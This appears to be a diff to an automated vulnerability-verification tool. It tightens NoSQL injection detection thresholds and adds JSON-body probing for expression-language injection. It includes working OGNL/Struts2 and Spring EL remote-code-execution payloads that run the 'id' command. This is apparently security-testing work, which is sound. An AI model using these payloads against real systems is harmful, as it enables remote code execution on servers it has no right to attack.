@@ -9107,7 +9107,8 @@ def verify_generic_nosql_injection(
                 confirmed = True
             elif not confirm_string and st in (200, 201, 202) and st_ctrl not in (200, 201, 202):
                 confirmed = True
-            elif not confirm_string and len(body) > len(body_ctrl) + 50:
+            # Body size alone: require >200B diff AND status is not an error
+            elif not confirm_string and st in (200, 201, 202) and len(body) > len(body_ctrl) + 200:
                 confirmed = True
 
             if confirmed:
@@ -9143,7 +9144,8 @@ def verify_generic_nosql_injection(
                 body_t = (b_t or b"").decode("utf-8", errors="replace")
                 body_f = (b_f or b"").decode("utf-8", errors="replace")
                 _len_diff = abs(len(body_t) - len(body_f))
-                if _len_diff >= 20 or (st_t != st_f):
+                # Require >100B diff OR status mismatch — 20B is Docker jitter
+                if _len_diff >= 100 or (st_t != st_f):
                     res.verified = True
                     res.ok = True
                     res.evidence["nosql_technique"] = "$where-boolean-blind"
@@ -11540,17 +11542,36 @@ def verify_generic_expression_language_injection(
 
             for _pl in _EL_VARIANTS:
                 step(f"probando EL payload: {_pl[:40]}…")
+                body = ""
+                r = None
                 try:
                     if http_method.upper() == "GET":
                         r = _rq.get(boot.base_url + endpoint,
                                     params={inject_param: _pl}, timeout=10)
+                        body = r.text or ""
                     else:
+                        # Try form-encoded first
                         r = _rq.request(http_method.upper(), boot.base_url + endpoint,
                                         data={inject_param: _pl}, timeout=10)
+                        body = r.text or ""
+                        # Also try JSON body injection if form-encoded didn't match
+                        if not _pat.search(body):
+                            try:
+                                import json as _json_mod
+                                r_j = _rq.request(
+                                    http_method.upper(), boot.base_url + endpoint,
+                                    headers={"Content-Type": "application/json"},
+                                    data=_json_mod.dumps({inject_param: _pl}), timeout=10)
+                                _jbody = r_j.text or ""
+                                if _pat.search(_jbody):
+                                    body = _jbody
+                                    r = r_j
+                                    res.evidence["injection_mode"] = "json_body"
+                            except Exception:
+                                pass
                 except Exception as e:
                     step(f"  error: {e}")
                     continue
-                body = r.text or ""
                 if _pat.search(body):
                     res.verified = True
                     res.ok = True
@@ -11574,6 +11595,11 @@ def verify_generic_expression_language_injection(
                         '${"id".execute().text}',
                         # Pebble/Jinja2-style fallback
                         '{{ "id" | system }}',
+                        # OGNL / Struts2
+                        "%{(#abc)(new java.lang.ProcessBuilder(new java.lang.String[]{'sh','-c','id'})).start()}",
+                        "%{(#container=#context['com.opensymphony.xwork2.ActionContext.application'])(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))(#ognlUtil.setExcludedClasses(''))(#ognlUtil.setExcludedPackageNames(''))(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))(#rt=@java.lang.Runtime@getRuntime())(#rt.exec('id'))}",
+                        # EL with Runtime (alternative class loader bypass)
+                        "${T(Thread).currentThread().getContextClassLoader().loadClass('java.lang.Runtime').getMethod('exec',T(String)).invoke(T(Runtime).getRuntime(),'id')}",
                     ]
                     _id_re = re.compile(r"uid=\d+\(\w+\)")
                     for _rce_pl in _RCE_PAYLOADS:
